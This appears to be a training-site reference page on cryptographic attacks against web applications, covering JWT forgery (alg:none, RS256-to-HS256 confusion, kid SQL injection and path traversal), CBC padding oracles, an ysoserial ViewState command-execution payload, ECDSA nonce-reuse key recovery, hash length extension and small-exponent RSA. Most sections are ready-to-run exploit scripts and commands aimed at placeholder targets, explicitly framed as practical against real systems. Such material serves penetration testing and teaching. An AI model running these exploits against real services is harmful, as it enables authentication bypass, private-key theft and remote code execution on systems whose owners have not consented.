---
layout: training-page
title: "Cryptographic Attack Reference — JWT, Padding Oracle, ECDSA & Hash Extension"
module: "Web Hacking"
tags:
  - cryptography
  - jwt
  - padding-oracle
  - ecdsa
  - hash-extension
  - cbc
  - algorithm-confusion
  - rsa
page_key: "web-crypto-attacks"
render_with_liquid: false
---

# Cryptographic Attack Reference

Practical cryptographic attacks found in web applications and APIs. These are not theoretical — JWT algorithm confusion breaks real SSO, padding oracle attacks still surface in enterprise middleware, and ECDSA nonce reuse is an active web3 attack. Each section covers the vulnerability, exploitation, and what the fix looks like.

---

## JWT Attacks

### Algorithm Confusion (None Algorithm)

```
# JWT structure:
# Header.Payload.Signature — base64url encoded, dot-separated

# Vulnerable server: accepts "alg":"none" → signature not verified
# Create forged token:
python3 << 'EOF'
import base64, json

def b64url(s): return base64.urlsafe_b64encode(s).rstrip(b'=').decode()

header = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"admin","role":"administrator","exp":9999999999}).encode())
forged = f"{header}.{payload}."  # empty signature

print(forged)
EOF

# Test against endpoint:
curl -s https://target.com/api/admin \
  -H "Authorization: Bearer ${FORGED_TOKEN}"
```

### RS256 → HS256 Algorithm Confusion

When a server uses RS256 (asymmetric), the *public key* is often downloadable. If the server also accepts HS256 (symmetric), the public key can be used as the HMAC secret:

```python
# Step 1: Get the public key from JWKS endpoint:
# GET https://target.com/.well-known/jwks.json
# or https://target.com/api/auth/public-key

# Step 2: Convert JWK to PEM:
python3 << 'EOF'
import jwt, json, requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Fetch public key (JWK format):
jwks = requests.get("https://target.com/.well-known/jwks.json").json()
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.asymmetric import rsa
import base64

key_data = jwks['keys'][0]
# Build PEM from JWK modulus and exponent:
from jwt.algorithms import RSAAlgorithm
pub_key = RSAAlgorithm.from_jwk(json.dumps(key_data))
pub_pem = pub_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)

# Step 3: Forge HS256 token signed with public key bytes as secret:
forged = jwt.encode(
    {"sub": "admin", "role": "admin", "exp": 9999999999},
    pub_pem,
    algorithm="HS256"
)
print(forged)
EOF
```

### JWT kid (Key ID) Injection

```
# kid parameter tells server which key to use for verification
# If kid is used in file path or SQL query:

# SQL injection via kid:
# {"alg":"HS256","kid":"x' UNION SELECT 'attackerkey' --"}
# Server query: SELECT key FROM keys WHERE id = 'x' UNION SELECT 'attackerkey' --
# Returns 'attackerkey' as the signing key → forge token signed with 'attackerkey'

python3 << 'EOF'
import jwt, json
import base64

header = {"alg": "HS256", "kid": "x' UNION SELECT 'attackerkey' -- "}
payload = {"sub": "admin", "role": "admin"}
token = jwt.encode(payload, "attackerkey", algorithm="HS256", headers=header)
print(token)
EOF

# Path traversal via kid (server reads key from disk):
# kid: "../../dev/null" → server reads /dev/null → empty key
# Sign token with empty string as secret:
python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, '', algorithm='HS256', headers={'kid':'../../dev/null'}))"
```

### JWT Tools

```
# jwt_tool — comprehensive JWT attack toolkit:
python3 jwt_tool.py <TOKEN> -t https://target.com/api/admin -rh "Authorization: Bearer JWT"
# Run all checks: --all
# Specific attack: --exploit alg  (alg:none)
# Specific attack: --exploit pk   (RS256→HS256)
# Specific attack: --exploit kid  (kid injection)

# hashcat — crack weak JWT secrets (HS256):
hashcat -m 16500 jwt.txt rockyou.txt
# where jwt.txt contains the raw JWT string
```

---

## CBC Padding Oracle Attack

Affects systems using AES-CBC + PKCS#7 padding where the server reveals padding validity. Classic targets: ASP.NET ViewState (POET - Padding Oracle Exploitation Tool), Oracle WebLogic, custom cookie encryption.

```
# What is revealed: server returns different error for "bad padding" vs "bad decryption"
# Oracle: any mechanism that tells attacker "padding is correct" or "padding is wrong"
# Examples: HTTP 500 vs 200, timing difference, different error message

# How CBC decryption works:
# Plaintext[i] = Decrypt(Ciphertext[i]) XOR Ciphertext[i-1]
# To manipulate Plaintext[i]: XOR Ciphertext[i-1] with desired value

# padbuster — automated padding oracle exploitation:
padbuster https://target.com/profile \
  "ENCRYPTED_COOKIE_VALUE" \
  8 \  # block size (8 for DES, 16 for AES)
  -cookies "auth=ENCRYPTED_COOKIE_VALUE" \
  -encoding 0  # base64

# paddingoracle Python tool:
pip install paddingoracle
python3 << 'EOF'
from paddingoracle import BadPaddingException, PaddingOracle
import requests

class TargetOracle(PaddingOracle):
    def oracle(self, data, **kwargs):
        cookies = {'auth': data.hex()}  # encode as needed
        r = requests.get("https://target.com/profile", cookies=cookies)
        if r.status_code == 500 and "Invalid padding" in r.text:
            raise BadPaddingException
        # 200 = valid padding

oracle = TargetOracle()
# Decrypt known ciphertext:
plaintext = oracle.decrypt(bytes.fromhex("CIPHERTEXT_HEX"), block_size=16, iv=bytes(16))
print(plaintext)
EOF

# ASP.NET ViewState padding oracle (MachineKey attack):
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --decryptionalg="AES" --decryptionkey="MACHINE_KEY" \
  --validationalg="SHA1" --validationkey="VALIDATION_KEY" \
  -c "cmd.exe /c whoami > C:\inetpub\wwwroot\out.txt"
```

---

## ECDSA Nonce Reuse (k-Reuse)

If two signatures use the same random nonce `k`, the private key can be recovered algebraically. This is practical in blockchain/web3 contexts and any custom ECDSA implementation.

```python
# Theory:
# Signature (r, s) where: r = (k*G).x mod n, s = k^-1 * (hash + r*d) mod n
# If k is reused across two signatures (r1==r2 since r is derived from k):
# s1 = k^-1 * (h1 + r*d) mod n
# s2 = k^-1 * (h2 + r*d) mod n
# (s1 - s2) * k = (h1 - h2) mod n
# k = (h1 - h2) * (s1 - s2)^-1 mod n
# Then: d = (s1*k - h1) * r^-1 mod n  (private key!)

python3 << 'EOF'
from hashlib import sha256

def modinv(a, n):
    # Extended Euclidean algorithm
    g, x, _ = extended_gcd(a % n, n)
    if g != 1: raise ValueError("No inverse")
    return x % n

def extended_gcd(a, b):
    if a == 0: return b, 0, 1
    g, x, y = extended_gcd(b % a, a)
    return g, y - (b // a) * x, x

# Two signatures with same nonce k:
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 order
r = 0xDEADBEEF  # same r value confirms same k was used
s1, s2 = 0x...S1..., 0x...S2...
h1 = int(sha256(b"message1").hexdigest(), 16)
h2 = int(sha256(b"message2").hexdigest(), 16)

k = (h1 - h2) * modinv(s1 - s2, n) % n
d = (s1 * k - h1) * modinv(r, n) % n
print(f"Private key: {hex(d)}")
EOF

# Real-world targets:
# - Custom ECDSA implementations using weak RNG (fixed seed, predictable nonce)
# - Sony PS3 firmware signing (classic example — used k=1)
# - Blockchain wallets reusing nonces (Lattice attacks on biased nonces)
# - Web3 contracts with on-chain signature verification

# lattice-based attack on biased nonces (HNP):
# pip install fpylll sage
# If nonces are biased (top/bottom bits known), lattice reduction recovers key
# with ~100 signatures — see: github.com/daedalus/bitcoin-recover-privkey
```

---

## Hash Length Extension Attack

Affects MAC constructions of the form `MAC = hash(secret || message)`. Attackers can append data and compute a valid MAC without knowing the secret.

```python
# Vulnerable construction:
# token = SHA256(secret + "user=alice&role=user")
# Server verifies: SHA256(secret + request_data) == token

# Attack: extend to user=alice&role=user&role=admin
# Without knowing secret, using hash state of original token

# hashpump tool:
hashpump
# Input data: user=alice&role=user
# Input signature: ORIGINAL_TOKEN_HEX
# Input key length: 16 (guessed or known)
# Data to add: &role=admin

# Python implementation:
pip install hashpumpy
python3 << 'EOF'
import hashpumpy, urllib.parse

original_data = "user=alice&role=user"
original_sig = "ORIGINAL_HASH_HEX"
data_to_add = "&role=admin"
key_length = 16  # brute-force if unknown (try 1-64)

new_sig, new_data = hashpumpy.hashpump(original_sig, original_data, data_to_add, key_length)
print(f"New data: {urllib.parse.quote(new_data)}")
print(f"New sig:  {new_sig}")
# Submit: request_data=<new_data>&token=<new_sig>
EOF

# Finding vulnerable endpoints:
# Look for URL parameters with hash/token/signature values
# Test: modify parameter, see if hash fails vs. succeeds with extension
# MD5 and SHA1/256/512 "Merkle-Damgård" constructions are all vulnerable
# SHA3 and HMAC are NOT vulnerable (different construction)
```

---

## RSA Attacks

### Small Public Exponent (e=3) with Cube Root

```python
# If e=3 and the message is short enough that m^3 < n:
# Ciphertext c = m^3 mod n, but if m^3 < n, then m = c^(1/3) exactly

python3 << 'EOF'
import gmpy2

c = int("CIPHERTEXT_HEX", 16)
e = 3
m, exact = gmpy2.iroot(c, e)
if exact:
    print("Plaintext:", bytes.fromhex(hex(m)[2:]))
else:
    print("Not exact cube root — n is involved")
EOF
```

### Hastad's Broadcast Attack

```python
# Same message encrypted with e=3 under 3 different public keys (n1, n2, n3):
# Use CRT to recover m^3, then cube root:

python3 << 'EOF'
from functools import reduce
import gmpy2

# c1, n1 = first ciphertext and modulus, etc.
c1, n1 = (int("C1HEX", 16), int("N1HEX", 16))
c2, n2 = (int("C2HEX", 16), int("N2HEX", 16))
c3, n3 = (int("C3HEX", 16), int("N3HEX", 16))

N = n1 * n2 * n3
result = (c1 * (N // n1) * int(gmpy2.invert(N // n1, n1)) +
          c2 * (N // n2) * int(gmpy2.invert(N // n2, n2)) +
          c3 * (N // n3) * int(gmpy2.invert(N // n3, n3))) % N

m, exact = gmpy2.iroot(result, 3)
if exact:
    print("Recovered plaintext:", bytes.fromhex(hex(int(m))[2:]))
EOF
```

---

## Quick Reference: Where to Find These in the Wild

| Attack | Where Found | Ease |
|--------|------------|------|
| JWT alg:none | Old JWT libraries (pre-2015), custom implementations | Easy |
| JWT RS256→HS256 | Microservices with exposed JWKS, SSO implementations | Medium |
| JWT kid injection | Custom JWT libraries, homegrown auth | Easy |
| CBC padding oracle | ASP.NET ViewState, Oracle Weblogic, legacy .NET apps | Medium |
| ECDSA nonce reuse | Custom crypto code, hardware wallets, web3 | Hard |
| Hash length extension | Legacy APIs using hash(secret+data), PHP applications | Easy |
| RSA e=3 cube root | CTF challenges, legacy encryption scripts | Easy |

---

## Tools Summary

```
# JWT:
jwt_tool       - comprehensive JWT attack automation
hashcat -m 16500 - crack weak HS256 secrets

# CBC Padding:
padbuster      - padding oracle automation
paddingoracle  - Python library for custom oracles

# Hash extension:
hashpump / hashpumpy - length extension automation

# RSA/ECDSA:
RsaCtfTool    - multiple RSA attacks in one tool
SageMath      - ECDSA lattice attacks, number theory
pycryptodome  - low-level crypto primitives for PoC building
```

---

## Resources

- JWT attacks — `portswigger.net/web-security/jwt`
- jwt_tool — `github.com/ticarpi/jwt_tool`
- CBC padding oracle tutorial — `podoliaka.org/2016/04/11/padding-oracle-attack/`
- Hash length extension — `github.com/bwall/HashPump`
- RsaCtfTool — `github.com/RsaCtfTool/RsaCtfTool`
- ECDSA nonce reuse — `minerva.crocs.fi.muni.cz`
- Cryptopals challenges (hands-on crypto attacks) — `cryptopals.com`
